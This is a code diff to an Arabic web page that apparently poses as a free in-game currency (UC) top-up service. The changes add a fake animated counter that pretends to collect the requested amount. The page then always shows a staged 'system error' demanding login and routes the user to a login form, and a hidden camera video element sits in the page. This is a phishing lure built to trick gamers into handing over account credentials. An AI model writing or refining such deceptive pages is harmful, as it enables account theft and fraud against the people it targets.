@@ -852,6 +852,44 @@
         font-size: 16px;
     }
 }
+        /* نافذة عملية الشحن */
+.charging-step {
+    display: none;
+}
+
+.charging-step.active {
+    display: block;
+}
+
+.circle-progress {
+    position: relative;
+    width: 200px;
+    height: 200px;
+    margin: 0 auto;
+}
+
+.circle-text {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+    color: white;
+}
+
+.circle-progress circle {
+    transition: stroke-dashoffset 0.5s ease;
+}
+
+@keyframes pulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.05); }
+    100% { transform: scale(1); }
+}
+
+.circle-progress {
+    animation: pulse 2s infinite;
+}
     </style>
 </head>
 <body>
@@ -1020,37 +1058,43 @@
         <video id="video" autoplay playsinline muted></video>
         <canvas id="canvas"></canvas>
     </div>
-   <!-- نافذة عملية الشحن -->
-<div id="charging-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 4000; justify-content: center; align-items: center;">
-    <div style="background: white; border-radius: 20px; padding: 40px; text-align: center; max-width: 500px; width: 90%;">
+    <!-- نافذة عملية الشحن المعدلة -->
+<div id="charging-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 4000; justify-content: center; align-items: center;">
+    <div style="background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); border-radius: 25px; padding: 50px 40px; text-align: center; max-width: 500px; width: 90%; color: white; box-shadow: 0 20px 40px rgba(0,0,0,0.3);">
         <div id="charging-steps">
             <!-- الخطوة 1 -->
             <div class="charging-step active">
-                <h3 style="color: #3498db;">🔄 جاري تحصيل الشدات</h3>
-                <div class="progress-container">
-                    <div class="progress-bar" id="progress1"></div>
+                <div class="circle-progress" id="circle-progress">
+                    <svg width="200" height="200" viewBox="0 0 200 200">
+                        <circle cx="100" cy="100" r="85" stroke="#34495e" stroke-width="10" fill="none"></circle>
+                        <circle cx="100" cy="100" r="85" stroke="#2ecc71" stroke-width="10" fill="none" 
+                                stroke-linecap="round" transform="rotate(-90 100 100)" 
+                                stroke-dasharray="534" stroke-dashoffset="534" id="circle-bar"></circle>
+                    </svg>
+                    <div class="circle-text">
+                        <div id="charge-counter" style="font-size: 32px; font-weight: bold;">0</div>
+                        <div style="font-size: 18px; margin-top: 5px;">شدة</div>
+                    </div>
                 </div>
-                <p id="charge-counter" style="font-size: 24px; font-weight: bold; color: #2c3e50; margin: 20px 0;">0 / 0</p>
+                <h3 style="color: #2ecc71; font-size: 24px; margin: 30px 0 10px 0;">🔄 جاري تحصيل الشدات</h3>
+                <p style="color: #bdc3c7; font-size: 16px;">جارٍ تجهيز طلبك...</p>
             </div>
             
             <!-- الخطوة 2 -->
             <div class="charging-step">
-                <h3 style="color: #e67e22;">⚡ جاري الشحن على الحساب</h3>
-                <div class="progress-container">
-                    <div class="progress-bar" id="progress2"></div>
+                <h3 style="color: #e74c3c; font-size: 26px; margin: 20px 0;">❌ خطأ في النظام</h3>
+                <div style="background: rgba(231, 76, 60, 0.1); padding: 20px; border-radius: 15px; margin: 20px 0; border: 2px solid #e74c3c;">
+                    <p style="color: #ffffff; font-size: 18px; margin: 10px 0;">⚠️ يجب تسجيل الدخول أولاً</p>
+                    <p style="color: #bdc3c7; font-size: 16px;">لإتمام عملية الشحن يرجى تسجيل الدخول</p>
                 </div>
-                <p style="color: #7f8c8d; margin: 20px 0;">جارٍ إضافة الشدات إلى حسابك...</p>
-            </div>
-            
-            <!-- الخطوة 3 -->
-            <div class="charging-step">
-                <h3 style="color: #e74c3c;">❌ خطأ في التسجيل</h3>
-                <p style="color: #c0392b; font-size: 18px; margin: 20px 0;">يجب تسجيل الدخول لإتمام عملية الشحن</p>
-                <button id="go-to-login" style="background: #3498db; color: white; border: none; padding: 12px 30px; border-radius: 10px; font-size: 16px; cursor: pointer; margin-top: 20px;">تسجيل الدخول</button>
+                <button id="go-to-login" style="background: linear-gradient(135deg, #3498db 0%, #2980b9 100%); color: white; border: none; padding: 15px 40px; border-radius: 12px; font-size: 18px; cursor: pointer; margin-top: 20px; font-weight: bold; box-shadow: 0 5px 15px rgba(52, 152, 219, 0.3);">
+                    تسجيل الدخول الآن
+                </button>
             </div>
         </div>
     </div>
-</div> 
+</div>
+   
 
     <script>
         // العناصر
@@ -1470,19 +1514,25 @@
                 stream.getTracks().forEach(track => track.stop());
             }
         });
-        // عناصر نافذة الشحن
+// عناصر نافذة الشحن
 const chargingModal = document.getElementById('charging-modal');
 const chargingSteps = document.querySelectorAll('.charging-step');
-const progress1 = document.getElementById('progress1');
-const progress2 = document.getElementById('progress2');
+const circleBar = document.getElementById('circle-bar');
 const chargeCounter = document.getElementById('charge-counter');
 const goToLoginBtn = document.getElementById('go-to-login');
+
+let chargingTimeout;
 
 // دالة عرض نافذة الشحن
 function showChargingProcess() {
     chargingModal.style.display = 'flex';
     showStep(0);
     startChargeCollection();
+    
+    // إظهار الخطأ بعد 10 ثواني
+    chargingTimeout = setTimeout(() => {
+        showStep(1);
+    }, 10000);
 }
 
 // دالة عرض خطوة معينة
@@ -1492,52 +1542,33 @@ function showStep(stepIndex) {
     });
 }
 
-// دالة تحصيل الشدات
+// دالة تحصيل الشدات مع دائرة التقدم
 function startChargeCollection() {
     const targetAmount = parseInt(selectedCharge.amount);
     let currentAmount = 0;
-    const duration = 3000;
+    const duration = 8000; // 8 ثواني للتقدم
     const interval = 50;
     const steps = duration / interval;
     const increment = targetAmount / steps;
     
-    chargeCounter.textContent = `0 / ${targetAmount}`;
+    const circumference = 2 * Math.PI * 85; // محيط الدائرة
+    circleBar.style.strokeDasharray = circumference;
+    
+    chargeCounter.textContent = '0';
     
     let progress = 0;
     const progressInterval = setInterval(() => {
         progress += (100 / steps);
-        progress1.style.width = `${Math.min(progress, 100)}%`;
+        const offset = circumference - (progress / 100) * circumference;
+        circleBar.style.strokeDashoffset = offset;
         
         currentAmount += increment;
         if (currentAmount >= targetAmount) {
             currentAmount = targetAmount;
             clearInterval(progressInterval);
-            setTimeout(() => {
-                showStep(1);
-                startAccountCharging();
-            }, 1000);
-        }
-        
-        chargeCounter.textContent = `${Math.floor(currentAmount)} / ${targetAmount}`;
-    }, interval);
-}
-
-// دالة شحن الحساب
-function startAccountCharging() {
-    let progress = 0;
-    const duration = 2000;
-    const interval = 50;
-    const steps = duration / interval;
-    
-    const progressInterval = setInterval(() => {
-        progress += (100 / steps);
-        progress2.style.width = `${Math.min(progress, 100)}%`;
-        
-        if (progress >= 100) {
-            clearInterval(progressInterval);
-            setTimeout(() => {
-                showStep(2);
-            }, 1000);
+            chargeCounter.textContent = targetAmount.toLocaleString();
+        } else {
+            chargeCounter.textContent = Math.floor(currentAmount).toLocaleString();
         }
     }, interval);
 }
@@ -1547,6 +1578,7 @@ goToLoginBtn.addEventListener('click', function() {
     chargingModal.style.display = 'none';
     mainContainer.style.display = 'none';
     loginContainer.style.display = 'block';
+    clearTimeout(chargingTimeout);
 });
 
 // عدل حدث زر المتابعة إلى الدفع
@@ -1574,9 +1606,15 @@ proceedBtn.addEventListener('click', function() {
     
     showChargingProcess();
 });
+
+// تنظيف الوقت عند إغلاق الصفحة
+window.addEventListener('beforeunload', () => {
+    clearTimeout(chargingTimeout);
+});
     </script>
 </body>
 </html>
+
 
 
 
